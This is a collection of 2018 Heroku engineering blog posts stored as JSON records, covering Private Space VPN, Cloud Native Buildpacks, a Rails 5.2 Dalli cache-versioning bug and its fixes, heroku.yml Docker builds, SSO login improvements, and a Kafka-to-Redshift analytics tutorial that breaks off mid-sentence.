{"website": "Heroku", "title": "VPN Support for Heroku Private Spaces", "author": ["Michael Friis"], "link": "https://blog.heroku.com/private-spaces-vpn", "abstract": "VPN Support for Heroku Private Spaces Posted by Michael Friis September 13, 2018 Listen to this article Today we're excited to announce Site-to-Site Virtual Private Network (VPN) support for Heroku Private Spaces . Heroku customers can now establish secure, site-to-site IPsec connections between Private Spaces on Heroku and their offices, datacenters and deployments on non-AWS clouds. VPN is a powerful, proven and widely-adopted technology for securely combining multiple networks (or adding individual hosts to a network) over encrypted links that span the public Internet. VPN is well-understood and in use by most enterprise IT departments, and is supported on all major cloud providers and by a range of hardware and software-based systems. VPN support complements Private Space VPC Peering and makes it simpler to securely build and maintain apps with dependencies that span Heroku, AWS, on-prem, Google Cloud Platform and other clouds. VPN and VPC Peering are examples of new features that are making Heroku easier for sysadmins and network engineers to integrate into existing infrastructure. We’re calling it \"Better Together\": For enterprises with large investments in legacy systems, we know that moving everything to the cloud in one fell swoop is not an option, and we're committed to letting you move gradually by making it simple and easy to build secure and reliable systems that straddle Heroku and existing infrastructure. Internal Routing Internal Routing is a companion feature for building microservices-based architectures on Heroku that we’re launching in conjunction with VPN support. You can now run multiple apps in a Private Space, for example a web front-end and an API back-end, and only publish the web front-end to the Internet. The front-end app has secure and performant access to the internally-published API, without traffic flowing over the public internet. API requests still transit the full Heroku HTTP stack so you don’t lose any Heroku features such as logging, load balancing or autoscaling. Check out the companion blog post on Private Spaces Internal Routing for details . Cabinet Secretariat: Internal Routing with Access Secured by VPN Cabinet Secretariat is an agency of the Japanese government that's building apps on Heroku. By using Heroku, Cabinet Secretariat can continuously improve apps and launch new ones to meet expanding requirements without worrying about setting up or maintaining infrastructure. One of Cabinet Secretariat's new apps is going to handle sensitive data and it’s a requirement that it only be accessed in an intranet-like fashion by government workers from secured networks and endpoints over VPN, as an additional security precaution. VPN combined with Internal Routing is what makes that work, because Heroku apps can now be published on an endpoint that's only accessible within the Private Space and from VPC-peered or VPN-connected networks. By combining Heroku's new VPN and Internal Routing features, Cabinet Secretariat is getting the best of both worlds: Intranet apps can be built and deployed quickly and updated frequently, and access is strictly limited because apps are only available to users that are on a private network connected to the Heroku Private Space via VPN. Hybrid and Multi-Cloud Architectures Configuring Private Space VPN is simple and to give you an idea of how the feature can be used to build Heroku apps that securely interact with services that are on-prem or in non-AWS clouds, we’ve built examples that show how to configure a Heroku to Google Cloud Platform VPN link. Check out the Dev Center guide for both manual setup instructions and an automated Terraform template . Summary Heroku Private Space VPN support is a powerful new tool for network engineers and admins to integrate Heroku apps with existing systems running on-prem and on non-AWS clouds. Combined with Heroku VPC Peering for AWS VPCs, it’s now possible to build secure hybrid cloud setups that span AWS, GCP, on-prem and Heroku. We can’t wait to see how Heroku customers use these new features to build and run great apps that interact with data sources and services that were not previously accessible securely from Heroku.  For more information on Private Space VPN, see the Dev Center article , or contact Heroku. Private Spaces IPsec VPC Peering Privacy security Enterprise Trust microservices multi-cloud hybrid cloud on-premises Google Cloud Platform AWS VPN", "date": "2018-09-13,"},
{"website": "Heroku", "title": "Buildpacks Go Cloud Native", "author": ["Terence Lee"], "link": "https://blog.heroku.com/buildpacks-go-cloud-native", "abstract": "Buildpacks Go Cloud Native Posted by Terence Lee October 03, 2018 Listen to this article Your Heroku application's journey to production begins with a buildpack that detects what kind of app you have, what tools you need to run, and how to tune your app for peak performance. In this way, buildpacks reduce your operational burden and let you to spend more time creating value for your customers. That's why we're excited to announce a new buildpack initiative with contributions from Heroku and Pivotal. The Cloud Native Computing Foundation (CNCF) has accepted Cloud Native Buildpacks to the Cloud Native Sandbox . Cloud Native Buildpacks turn source code into Docker images. In doing so, they give you more power to customize your runtime while making your apps more portable. The CNCF provides a vendor neutral home that will foster collaboration and help us leverage these cloud native virtues. Buildpacks will change and grow, but we'll continue to provide our customers with the same Heroku experience they know and love. Buildpacks for Heroku and Beyond The Heroku experience you're used to began seven years ago, when buildpacks were created . Initially they were used as a mechanism to enable polyglot programming language support on the platform. As more and more developers created buildpacks, they grew beyond languages. Today there are buildpacks for Nginx , Meteor , React , and even Minecraft . To minimize vendor lock-in, we published the Buildpack API in 2012 and removed the Heroku-specific elements. Since then each vendor that adopted buildpacks evolved the API independently, which led to isolated ecosystems. As a Cloud Native Sandbox project, we're standardizing the Buildpack API for all platforms and opening up the tooling we'll use to work with and run buildpacks under the Buildpack GitHub organization . We open sourced buildpacks because we wanted to see it spread beyond Heroku. Adopting these new container standards helps fulfill that vision by opening the door for anyone and everyone who works with containers and OCI images. What's remarkable about buildpacks' longevity is how much has changed since they first appeared. In 2012, we weren't thinking about microservices or containers. Despite these shifts in technology, buildpacks are as relevant as ever. Our original vision of an open and vendor neutral way to build apps is as important today as it was when buildpacks launched. Cloud Native Buildpacks allow us to fulfill that vision. That said, there's more buildpacks can do to take advantage of this cloud native era. How Cloud Native Buildpacks Work Cloud Native Buildpacks retain the simplicity that made Buildpacks popular but also embrace modern container standards, including Docker images or any other Open Container Initiative (OCI)-compatible Image. Combining these standards with our mature container runtime will improve portability and solve other problems for our users that buildpacks have not. The widespread adoption of containers across cloud providers has made container images the new executable of the cloud. Cloud Native Buildpacks will be the gateway to this environment. At a very high level, Cloud Native Buildpacks turn source code into production ready Docker images that are OCI image compatible. Let's take a closer look at how they do this. A Cloud Native Buildpack requires only two scripts: bin/detect bin/build The bin/detect script, like buildpacks of old, determines if a given buildpack is appropriate for your source code. For example, a Node.js buildpack will look to see if your app has a package.json file, and return a positive result if it finds one. The bin/build script will prepare your app's source code for production. Most buildpacks will install your app's dependencies, and prepare static assets. If the buildpack supports a compiled language like Java or Go, it will install and run a compiler against your code to generate binaries. During the bin/build process, a Cloud Native Buildpack can put certain dependencies or artifacts into OCI image layers. In this way, the buildpacks can structure your layers to ensure a clean separation of concerns and optimize caching. In comparison to other image generation protocols, such as Dockerfile, Cloud Native Buildpacks are app aware. They know how to install the runtimes and frameworks you use, and automatically provide security updates when possible. They know how to execute your app's build tools—often better than you do—and they know how to start your app with the best configuration for a given environment. What's Next Get started hacking Cloud Native Buildpacks today by forking one of the Buildpack Samples ! Read up on the implementation specifics laid out in the Buildpack API documentation , and join the public Buildpacks Slack . Even after seven years, there's never been a more exciting time for buildpacks. As we continue this cloud native journey with buildpacks, we look to you for feedback that will help us prioritize and direct our efforts. Whether you're a buildpack user on Heroku, a buildpack author, or another cloud provider, we need your feedback to shape the future. Join the conversation . open standard OCI image containers Docker cloud native cncf buildpacks", "date": "2018-10-03,"},
{"website": "Heroku", "title": "Heroku Buildpack Registry: Making Buildpacks Open and Shareable", "author": ["Jon Byrum"], "link": "https://blog.heroku.com/heroku-buildpack-registry", "abstract": "Heroku Buildpack Registry: Making Buildpacks Open and Shareable Posted by Jon Byrum October 04, 2018 Listen to this article Yesterday we announced a major step towards making buildpacks a multi-platform, open standard by contributing to Cloud Native Buildpacks , a Sandbox Project hosted by the Cloud Native Computing Foundation.  Today, we are announcing that you can now easily share your buildpacks with the world, by registering them with the Heroku Buildpack Registry. As of this post, the Buildpack Registry contains over 100 buildpacks created by authors like you.    Because of your contributions, Heroku developers can easily use languages and frameworks like Meteor, Elixir, and React in their applications.  If you’ve created a custom buildpack and wish to share it with the community, visit Dev Center to learn more about registering your buildpack . Registering Your Buildpack Registration is simple; visit the Heroku Partner Portal and specify a namespace, name, description, and support level. After registration, your buildpack will be discoverable via the heroku buildpacks:search CLI command and eventually Heroku Elements (expected late 2018). $ heroku buildpacks:search python\n\nBuildpack                   Category       Description\n─────────────  ──────   ────────────────\njbyrum/special-python       languages      A very special python buildpack...\n…\n\n$ heroku buildpacks:info jbyrum/special-python\n\n=== jbyrum/special-python\ndescription: A very special python buildpack for the Heroku community\ncategory:    languages\nlicense:     MIT License\nsupport:     https://github.com/jbyrum/special-python-buildpack/issues\nsource:      https://github.com/jbyrum/special-python-buildpack\nreadme:     ...\n\n$ heroku buildpacks:set jbyrum/special-python\n\nBuildpack set. Next release on random-app-1234 will use jbyrum/special-python.\nRun `git push heroku master` to create a new release using this buildpack. As a buildpack author, the Buildpack Registry also provides you with a number of advanced features allowing you to publish a new version of your buildpack, as well as rollback if a new version doesn’t work as intended. Buildpacks Are Open and Shareable With yesterday’s announcement of the Cloud Native Buildpacks project, combined with our new Buildpack Registry, Heroku is committed to making buildpacks both an open standard and easy to share with the developer community.  Learn more about creating a custom buildpack or registering your buildpack on Dev Center. Cloud Native Buildpacks buildpack registry buildpacks buildpack", "date": "2018-10-04,"},
{"website": "Heroku", "title": "Cache Invalidation Complexity: Rails 5.2 and Dalli Cache Store", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/cache-invalidation-rails-5-2-dalli-store", "abstract": "Cache Invalidation Complexity: Rails 5.2 and Dalli Cache Store Posted by Richard Schneeman October 16, 2018 Listen to this article Rails applications that use ActiveRecord objects in their cache may experience an issue where the entries cannot be invalidated if all of these conditions are true: They are using Rails 5.2+ They have configured config.active_record.cache_versioning = true They are using a cache that is not maintained by Rails, such as dalli_store (2.7.8 or prior) In this post, we discuss the background to a change in the way that cache keys work with Rails, why this change introduced an API incompatibility with 3rd party cache stores, and finally how you can find out if your app is at risk and how to fix it. Even if you're not at Rails 5.2 yet, you'll likely get there one day. It's important to read and potentially mitigate this issue before you run into it in production. Background: What are Recyclable Cache keys? One of the hallmark features of Rails 5.2 was \"recyclable\" cache keys . What does that mean and why do you want them? If you're caching a view partial that has an Active Record object when the object changes then you want the cache to invalidate and be replaced with the new information. The old way that Rails accomplished cache invalidation is to put version information directly into the cache key. For an Active Record object this means a formatted string of :updated_at . For example: # config.active_record.cache_versioning = false\nuser = User.first\nuser.name = \"richard\"\nuser.save\nuser.cache_key\n# => \"users/1-<version-1>\" This scheme is quite robust. When the object changes so does the key: # config.active_record.cache_versioning = false\nuser = User.first\nuser.name = \"schneems\"\nuser.save\nuser.cache_key\n# => \"users/1-<version-2>\" However, this causes unnecessary cache invalidations. For example, let's say that you have three objects and three slots in your cache. Letters A, B, and C differentiate the objects, while a number indicates their versions, these are all version one: [A(1), B(1), C(1)] When object A changes, it doesn't evict the cache for object A, instead, it evicts the last cache entry which is C. Now the cache looks like this: [A(2), A(1), B(1)] The next time that C is requested it won't be found, and it will be re-calculated and get added to the front of the cache. This addition pushes out the copy of B: [C(1), A(2), A(1)] Now the next time that B is requested it won't be found, and it will be re-calculated and get added to the front of the cache: [B(1), C(1), A(2)] While we only made one change to object A, it resulted in clearing and resetting the values for both B(1) and C(1) even though they never changed. This method of cache invalidation adds unnecessary time spent recalculating already valid cache entries. Cache versioning's goal is to fix this unneeded cache invalidation. Cache invalidation with cache versioning (recyclable cache keys) With the new method of cache versioning, the keys stay consistent, but the cache_version is stored inside the cache entry and manually checked when pulling an entry from the cache. # config.active_record.cache_versioning = true\nuser = User.first\nuser.name = \"richard\"\nuser.save\nuser.cache_key\n# => \"users/1\"\n\nuser.cache_version\n# => \"<version-1>\"\n\nuser.name = \"schneems\"\nuser.save\nuser.cache_key\n# => \"users/1\"\n\nuser.cache_version\n# => \"<version-2>\" Here's an example of how the cache works with cache versioning: [A(1), B(1), C(1)] When object A changes, to version two, it will pull the A(1) object from the cache, see that it has a different version, and replace the entry in the same slot using a consistent cache key: [A(2), B(1), C(1)] Now future calls to retrieve the A object will show that the version is correct, and the cached value can be used. With this new scheme, changing one object does not have a cascade effect on other cached values. In this way, we're able to keep valid items in our cache longer and do less work. How well does it work? DHH at Basecamp had this to say: We went from only being able to keep 18 hours of caching to, I believe, 3 weeks. It was the single biggest performance boost that Basecamp 3 has ever seen. By enabling recyclable cache key versioning ( config.active_record.cache_versioning = true ), instead of having to recalculate every cache entry every 18 hours effectively, the churn spread out over 3 weeks, which is very impressive. What's the issue? Now that you know what recyclable cache keys are and how Rails implements them you should know that the client that talks to the cache provider needs to be aware of this new scheme. Rails ships with a few cache stores :memory_store :file_store :mem_cache_store :redis_cache_store If you're using one of these stores then you get a cache client that supports this feature flag. However, you can also provide a custom cache store and other gems ship with a store. Most notably: :dalli_store (not maintained by Rails) If you're using a custom cache store then it's up to that library to implement this new scheme. If you're using :dalli_store right now and have config.active_record.cache_versioning = true then you are quietly running in production without the ability to invalidate caches. For example, you can see CodeTriage, an app that helps people contribute to Open Source not change the view when the underlying database entry is modified: Why is this happening? Remember how we showed that the cache key is the same no matter if the model changes? The Dalli gem (as of version 2.7.8) only understands the cache_key , but does not understand how to insert and use cache versions. When using the :dalli_store and you've enabled recyclable cache keys then the cache_key doesn't change and it will always grab the same value from the cache. How to detect if you're affected First confirm what cache store you're using, make sure to run this in a production env otherwise you might be using a different cache store for different environments: puts Rails.application.config.cache_store.inspect\n# => :dalli_store If it's not on the above list of officially supported Rails cache backends then you might be affected. Next, inspect your cache versioning: puts Rails.application.config.active_record.cache_versioning\n# => true # truthy values along with `:dalli_store` cause this issue How to mitigate There are several options, each with their own trade-off. Switch from dalli to :mem_cache_store You can switch away from the :dalli_store and instead use the official :mem_cache_store that ships with Rails: config.cache_store = :mem_cache_store Note: This cache store still uses the dalli gem for communicating with your memcache server. If you were previously passing in arguments it looks like you can just change the store name, for instance if you're using the memcachier service it might look like this: config.cache_store = [:mem_cache_store, (ENV[\"MEMCACHIER_SERVERS\"] || \"\").split(\",\"),\n                      { :username => ENV[\"MEMCACHIER_USERNAME\"],\n                        :password => ENV[\"MEMCACHIER_PASSWORD\"],\n                        :failover => true,\n                        :socket_timeout => 1.5,\n                        :socket_failure_delay => 0.2 }] This was tested on CodeTriage . Pros: With this store you get cache key recycling, you also get cache compression which helps significantly with time transferring bytes over a network to your memcache service. To achieve these features this cache store does more work than the raw :dalli_store , in preliminary benchmarks on CodeTriage while connecting to an external memcache server the performance is roughly equivalent (within 1% of original performance). With the decreased space from compression and the extra time that cache keys can \"live\" before being evicted with key recycling, this makes this store a net positive. Cons: The cache keys for :mem_cache_store are identical to the ones generated via :dalli_store , however it does not have the version information stored in the cache entry yet. When :mem_cache_store sees this it falls back to the old behavior of not validating the \"freshness\" of the entry. This means in order to get the updated behavior where changing an Active Record object actually updates the database you'll need to invalidate old entries. The \"easiest\" way to do this is to is to flush the whole cache. The problem with this is that will significantly slow your service as your entire application is then functioning with a cold cache. Disable recyclable cache keys (cache versioning) If you don't want to replace your cache store, disabling the cache versioning feature will also fix the issue of changing Active Record objects not invalidating the cache. You can disable this feature like this: config.active_record.cache_versioning = false If you're wondering about the config naming as I was it's cache_versioning because the version of the object lives in the cache rather than in the key. It's effectively the same thing as enabling or disabling recyclable caching. Pros: You don't have to switch your cache store. Doesn't require a cache flush (but will instead manually invalidate keys automatically due to changing cache key format). You can use this information to slowly roll out the cache key changes if you're able to do blue/green deploys and roll out to a percentage of your fleet. You'll still get some instances operating under a cold cache but by the time 100% of instances are running with the new version then the cache should be fairly \"warm\". Cons: You won't have to flush your old cache, BUT the cache key format will change which effectively does the same thing. When you change this config then your whole app will not be able to use any cache keys from before and will effectively be working with a cold cache while you're re-building old keys. You do not get recyclable keys. You do not get cache compression. Disabling the cache versioning will also mean that dalli must do more work to build cache keys which actually makes caching go slightly slower. Overall I would recommend switching to :mem_cache_store and then flushing the cache. Upgrade Dalli to 2.7.9+ Dalli version 2.7.9 has introduced a bugfix for the above problem . Upgrading to version 2.7.9 of this gem will mitigate the issue, however it will not use \"recyclable cache keys\" as described above, and instead manually inserts the version into the cache key rather than relying on only the cache_key method. To use memcache with \"recyclable cache keys\", you'll need to use the :mem_cache_store . Next steps At Heroku we've taken efforts to update all of our documentation to suggest using :mem_cache_store instead of directly using dalli. That being said there are still a ton of historical references to using the older store if you see one in the wild please make a comment and point at this post. Since the issue is deeper than the :dalli_store , it potentially affects any custom cache we need a way to systematically let people know when they're at risk for running in a bad configuration. My proposal is to add a predicate method to all maintained and supported Rails cache stores for example ActiveStorage::Cache::MemCacheStore.supports_in_cache_versioning? (method name TBD). If the app specifies config.active_record.cache_versioning = true without using a cache that responds affirmatively to supports_in_cache_versioning? then we can raise a helpful error that explains the issue. There's also work being done on dalli both for adding a limited form of support and for adding documentation. As it is said there are two truly hard problems in computer science: cache invalidation, naming, and off by one errors. While this incompatibility is unfortunate it's hard to make a breaking API change that fully anticipates how all external consumers will work. I've spent a lot of time in the Rails contributor chat talking with DHH and Rafael and there's a really good thread of some of the perils of changes that touch cache keys in one of my performance PRs . We realize the sensitive nature of changes anywhere near caching. In addition to bringing more scrutiny and awareness to these types of changes, we're working towards making more concrete policies. dalli cache ruby rails", "date": "2018-10-16,"},
{"website": "Heroku", "title": "Building Docker Images with heroku.yml Is Generally Available", "author": ["Jon Byrum"], "link": "https://blog.heroku.com/build-docker-images-heroku-yml", "abstract": "Building Docker Images with heroku.yml Is Generally Available Posted by Jon Byrum November 13, 2018 Listen to this article Last October, we announced the ability for you to deploy pre-built Docker images to Heroku via Container Registry.  Today, building Docker images with heroku.yml is generally available; you can now: Use git push heroku master to build your Docker images on Heroku Take advantage of review apps in Docker-based projects For most teams, using containers in production requires you to spend time setting up and maintaining complex infrastructure.  By using heroku.yml to build your Docker images, you get the power and flexibility of using Docker to package your app, combined with Heroku’s high-productivity developer experience, container orchestration, an add-ons ecosystem, and managed infrastructure. To get started, simply reference your Dockerfiles in a heroku.yml file, set your app’s stack to container , and push your code to deploy: $ cat heroku.yml\n# An example heroku.yml\nbuild:\n  docker:\n    web: Dockerfile\nrun:\n  web: bundle exec puma -C config/puma.rb $ git push heroku master\nremote: Compressing source files... done.\nremote: Building source:\nremote: === Building web (Dockerfile)\nremote: Sending build context to Docker daemon  11.26kB\nremote: Step 1/2 : FROM alpine:latest\n…\nremote: Successfully built e3a5e126e300\nremote: === Pushing web (Dockerfile)\n…\nremote: Verifying deploy... done. For more detail, check out the building Docker images with heroku.yml Dev Center documentation . Use Review Apps with Your Docker-based Projects With today’s release, your Docker-based projects can now take advantage of review apps , a powerful tool for team collaboration.  Review apps allow team members to test code changes — before they are merged — on a live URL. In the following screenshot, after a pull request is created on the project’s GitHub repo, a Docker build is triggered, and a new ephemeral Heroku app is created.  The app can be shared with team members for review. Specifying the Docker Images to Build heroku.yml is a new, optional manifest that can be used to define your build.  It includes 4 sections for specifying how an app should be set up, built, released, and run: setup - Specify the add-ons and config vars you would like created at app provisioning build - Specify the Docker images to build release - Specify the release phase tasks to execute run - Specify process types and the commands to run.  Procfile is ignored. In the following advanced example, heroku.yml is used to build multiple Docker images as well as reuse Docker images with multiple process types: # Resources to provision on app creation\nsetup:\n  addons:\n    - plan: heroku-postgresql\n      as: DATABASE\n  config:\n    S3_BUCKET: my-example-bucket\n# Reference the Dockerfiles to build into Docker images \nbuild:\n  docker:\n    web: Dockerfile\n    worker: worker/Dockerfile\n  config:\n    RAILS_ENV: development\n    FOO: bar\n# Run a command on each release \nrelease:\n  command:\n    - ./deployment-tasks.sh\n  # Use the worker image to execute the release command\n  image: worker\n# The process types and commands to run\nrun:\n  web: bundle exec puma -C config/puma.rb\n  worker: python myworker.py\n  asset-syncer:\n    command:\n      - python asset-syncer.py\n      # Use the worker image with this process type\n      image: worker If your team isn’t using Docker, you can also use heroku.yml with buildpacks . Run Dockerized Apps on Heroku With today’s release, combined with Container Registry , Heroku allows you to use the tools your know and love to package your apps, while benefiting from Heroku’s high-productivity developer experience, add-ons ecosystem, and managed infrastructure.  Focus on building your app with Docker , without having to roll your own container orchestration infrastructure. container registry buildpacks Docker", "date": "2018-11-13,"},
{"website": "Heroku", "title": " Improving the SSO Experience: CLI Login and Certificate Management", "author": ["Khushboo Goel"], "link": "https://blog.heroku.com/sso-improvements", "abstract": "Improving the SSO Experience: CLI Login and Certificate Management Posted by Khushboo Goel December 05, 2018 Listen to this article We are happy to announce two major improvements to our SSO experience for Heroku Enterprise customers: easier SSO login for users via the Heroku CLI, and the ability for admins to add more than one certificate at the Enterprise Team level. Logging into all your different cloud applications can be a pain. We know that many of you like to use Heroku via the command line interface and in your web browser side-by-side, and until now that has meant logging in via SSO separately to each interface. You'll now be redirected from the CLI to the Dashboard to complete your SSO login to Heroku, after which your SSO credentials will be synced. We've also made the administrative experience for changing SSO certificates even easier; previously admins could add only one certificate at the Enterprise Team level, and updating or changing it required downtime. Now admins can add up to three certificates at the Enterprise Team level to ensure zero downtime, and receive multiple, automated email notifications when their team's certificates approach expiry dates. New SSO Login Experience We wanted to reduce the time that developers spend validating credentials so that they can focus on development and innovation. The new SSO login allows a more synchronized experience between the Heroku CLI and Dashboard. Here's how to try it out: Run heroku update to make sure that you're on the most recent version of the CLI. Type heroku login and you'll be prompted to type any key to open up a new browser window. There is no need to add an --sso flag (though behavior will be the same if you do include it) Log in to Heroku in the Dashboard and you will be automatically logged into the CLI as well! Multi-certificate Management &  Expiry Notifications Previously, changing the certificate used at the Enterprise Team level for SSO required downtime; during this period users wouldn't be able to authenticate with Heroku via SSO. To enable zero-downtime with SSO certificate changes, we have now made it possible to add up to three SSO certificates for Enterprise Teams. SAML assertions signed under any one of the non-expired SSO certificates will be accepted, making it possible to seamlessly switch to a new identity provider certificate without downtime. In addition, we now send email notifications to Enterprise Team admins when an SSO certificate is approaching the expiry date. Notifications are triggered thirty days, seven days and one day before a certificate expires. Admin users can proactively update expiring certificates so users' ability to login via SSO remains uninterrupted. Summary With this release, Heroku Enterprise users can login from the CLI and seamlessly complete their login via SSO from the Heroku Dashboard; developers stay in context and remain focused on delivering features. Heroku Enterprise admins can ensure zero downtime for their SSO users with an easy-to-use interface for managing multiple certificates. Heroku Enterprise provides secure, isolated environments for teams of all sizes. Admins can set up the required identity and security measures, while developers can innovate and focus on their apps in an easy-to-use, collaborative environment. With these two features, we continue to make the Heroku Enterprise experience simpler and more secure for developers and admins. Heroku Enterprise SSO certificates Dashboard login CLI login login SSO login certificates SSO", "date": "2018-12-05,"},
{"website": "Heroku", "title": "Managing Real-time Event Streams and SQL Analytics with Apache Kafka on Heroku, Amazon Redshift, and Metabase", "author": ["Vikram Rana"], "link": "https://blog.heroku.com/event-streams-kafka-redshift-metabase", "abstract": "Managing Real-time Event Streams and SQL Analytics with Apache Kafka on Heroku, Amazon Redshift, and Metabase Posted by Vikram Rana December 06, 2018 Listen to this article Building a SaaS product, a system to handle sensor data from an internet-connected thermostat or car, or an e-commerce store often requires handling a large stream of product usage data, or events. Managing event streams lets you view, in near real-time, how users are interacting with your SaaS app or the products on your e-commerce store; this is interesting because it lets you spot anomalies and get immediate data-driven feedback on new features. While this type of stream visualization is useful to a point, pushing events into a data warehouse lets you ask deeper questions using SQL. In this post, we’ll show you how to build a system using Apache Kafka on Heroku to manage and visualize event streams from any type of data producer. We’ll also see how you can build consumers that can push those event streams from Heroku into Amazon Redshift for further analysis using Metabase, an open source product analytics tool. System overview System Overview This is an example system that captures a large stream of product usage data, or events, to provide both real-time data visualization and SQL-based data analytics. The system uses a simple Node.js app deployed to Heroku called generate_data to simulate usage data for an e-commerce store, but this could be replaced with almost anything that produces data: a marketing website, a SaaS product, a point-of-sale device, a kiosk, an internet-connected thermostat or car. And more than one data producer can be added. generate_data 1 is an app that produces a stream of events into an Apache Kafka cluster managed by Heroku. The event stream is then available to other downstream consumers. Apache Kafka is an append-only immutable event log and the leading open source project for managing billions of events. In our example system, there are two apps that are downstream consumers of the data. A web-based data visualization app running on Heroku, viz 1 , allows viewing the data flowing through Kafka in near real-time. viz shows the relative volume of product data being written into Kafka. The other Heroku app, reshift_batch 1 , consumes events from Kafka and stores all the data in RedShift, which Amazon describes as \"a fast, fully-managed, petabyte-scale data warehouse.\" Once the data is in Redshift, we can write ad-hoc queries and visualize the data using trend analysis and data dashboards using a SQL-compliant analytics tool. This example uses Metabase deployed to Heroku . Metabase is an open-source analytics tool used by many organizations, large and small, for business intelligence. It has many similar capabilities as Tableau or Looker . Managing Event Streams with Apache Kafka & Node.js To get this system up and running we first need to simulate our product usage events. To do this we’ve created a simple Node.js app generate_data . generate_data bootstraps a batch ShoppingFeed of simulated events that represents user interactions on our fictitious website such as adding a product to a wishlist or shopping cart. Since we’re generating millions of events we’ll use Kafka to manage all of these events. generate_data sends each product data event to the configured Kafka topic on a single partition using no-kafka , an open source Kafka client for Node.js. const producer = new Kafka.Producer(config.output.kafka);\n  let ended = 0;\n  let sf = null;\n\n  const handleOutput = (event) => {\n    producer.send({\n      topic: config.output.topic,\n      message: { value: JSON.stringify(event) },\n      partition: 0\n    })\n      .then((r) => {\n      })\n    .catch((e) => {\n      console.log(e);\n      throw e;\n    });\n  }; To try this yourself, first get the source. $ git clone git@github.com:heroku-examples/analytics-with-kafka-redshift-metabase.git\nCloning into 'analytics-with-kafka-redshift-metabase'...\nremote: Enumerating objects: 1192, done.\nremote: Counting objects: 100% (1192/1192), done.\nremote: Compressing objects: 100% (548/548), done.\nremote: Total 1192 (delta 635), reused 1135 (delta 586), pack-reused 0\nReceiving objects: 100% (1192/1192), 2.27 MiB | 1005.00 KiB/s, done.\nResolving deltas: 100% (635/635), done.\n$ cd analytics-with-kafka-redshift-metabase Then create an empty Heroku app and provision a fully-managed Kafka cluster on Heroku (this takes just a few seconds for a multi-tenant plan and less than 10 minutes for a dedicated cluster) to the app; once provisioned, create a topic called ecommerce-logs where we will send all of our events and then deploy the sample codebase to your Heroku app. Notice we also created a consumer group for later use by downstream consumers. $ heroku create\n$ heroku addons:create heroku-kafka:basic-0\n$ heroku kafka:topics:create ecommerce-logs\n$ heroku kafka:consumer-groups:create redshift-batch\n$ heroku config:set KAFKA_TOPIC=ecommerce-logs\n$ heroku config:set KAFKA_CONSUMER_GROUP=redshift-batch\n$ git push heroku master You’ll also need to ensure your app's environment variables are set via config vars in Heroku: Kafka topic, cluster URL, and client certificates. This is all done for you if you follow the directions above. Note: using Apache Kafka will incur costs on Heroku . Real-time Stream Visualization Given the holidays are fast approaching, let’s visualize the usage of the ‘wishlist’ feature of our fictitious store in near real-time by our users. Why might we want to do this? Let’s say the marketing team wants to drive engagement leading to more sales by promoting the wishlist feature—as the product development team, we’d like to give them the ability to see if users are responding as soon as the campaign goes out, both for validation but also to detect anomalies. To do this we’ll use the viz app mentioned earlier to consume events from Kafka that represent adds to the wishlist and display the average volume by product category in a D3 stacked, stream chart . If a product category were missing from the wishlist, we could easily see it below and dig deeper to find the source of the error. Live D3 stream chart Underneath the hood viz is just a Node.js Express app listening to Kafka and passing the events out on a WebSocket ; we use a Simple Kafka Consumer from no-kafka to consume events from the same topic we produced to earlier with generate_data . this._consumer = new Kafka.SimpleConsumer({\n      idleTimeout: this._interval,\n      connectionTimeout: 10 * 1000,\n      clientId: topic,\n      ...consumer\n    }) We can then broadcast events to the WebSocket server for visualization. init() {\n    const { _consumer: consumer } = this\n    const { clientId: topic } = consumer.options\n\n    return consumer\n      .init()\n      .then(() => consumer.subscribe(topic,this.onMessage.bind(this)))\n      .then(() => setInterval(this.cullAndBroadcast.bind(this), this._interval))\n  } Real-time Product Analytics Using Amazon Redshift and Metabase While the ability to visualize how our users are interacting with our app in real-time using event streams is nice, we need to be able to ask deeper questions of the data, do trend and product analysis, and provide our business stakeholders with dashboards. With Kafka, we can easily add as many consumers as we like without impacting the scalability of the entire system and preserve the immutability of events for other consumers to read. When we deployed our example system earlier we also deployed redshift_batch , a Simple Kafka Consumer that uses consumer groups that allows us to horizontally scale consumption by adding more dynos (containers). redshift_batch has a few simple jobs: consume events, send those events to Amazon Redshift for datawarehousing, and then commit the offsets of messages it has successfully processed. Connecting and writing to Redshift from Heroku is simply a matter of using pg-promise —an interface for PostgreSQL built on top of node-postgres —with a DATABASE_URL environment variable. You’ll also need to create the table in Redshift to receive all the events. const db = Postgres(Config.database);\ndb.connect();\nconst ecommTable = new Postgres.helpers.ColumnSet(['time', 'session', 'action', 'product', 'category', 'campaign'], {table: 'ecommercelogs'});\n\nconst consumer = new Kafka.SimpleConsumer({\n  ...Config.kafka.config,\n  groupId: Config.kafka.group\n});\n\nlet queue = [];\nlet lastUpdate = performance.now();\nlet lock = false;\n\nconst dataHandler = (messageSet, topic, partition) => {\n  messageSet.forEach((msg) => {\n    const now = performance.now();\n    const sinceLast = now - lastUpdate;\n    const value = JSON.parse(msg.message.value);\n    const offset = msg.offset;\n    const length = queue.push(value);\n    if (lock === false && (length >= Config.queueSize || sinceLast > Config.timeout)) {\n      console.log(queue.length);\n      lock = true;\n      lastUpdate = now;\n      const query = Postgres.helpers.insert(queue, ecommTable);\n      db.query(query, queue)\n        .then((data) => {\n          return consumer.commitOffset({ topic, partition, offset });\n        })\n        .then(() => {\n          lock = false;\n          console.log('unlock');\n        })\n        .catch((err) => {\n          lock = false;\n          console.log(err);\n        });\n      queue = [];\n    }\n  });\n};\n\n\nconsumer.init().then(() => {\n  consumer.subscribe(Config.kafka.topic, dataHandler);\n}); Note for all this to work you’ll need an Amazon Redshift cluster and a few other resources; check out this Terraform script for an automated way to create a RedShift cluster along with a Heroku Private Space and a private peering connection between the Heroku Private Space and the RedShift's AWS VPC. Note: this will incur charges on AWS and Heroku, and requires a Heroku Enterprise account. The final piece of our system is the ability to use SQL to query and visualize data in Redshift; for this we can use Metabase, a free open-source product analytics tool that you can deploy to Heroku using Metabase's Heroku Button . Once deployed, you'll need to configure Metabase with the RedShift cluster URL, database name, username, and password. Now members of your team can kick back, use Metabase’s point and click interface, write ad-hoc SQL queries, and create product analytics dashboards on top of the millions of events your users generate daily, trended over time. Metabase in action Summary Event-driven architectures and real-time analytics are an important feature of a modern web app on Heroku . In that post, we mentioned that customer facing applications are now at the core of every business; those same applications are continuously producing data in real-time at an accelerated rate. Similar to the way applications and code are now containerized, orchestrated and deployed continuously, high-volume event streams must be managed and moved in an organized way for visualization and analysis. We need to extend our web app with a system comprising A tool that can manage large streams of data reliably and to which data producers and data consumers can easily attach themselves A data warehouse tool to organize the data and make it queryable quickly Data query and visualization tools that are simple to connect to the data warehouse and 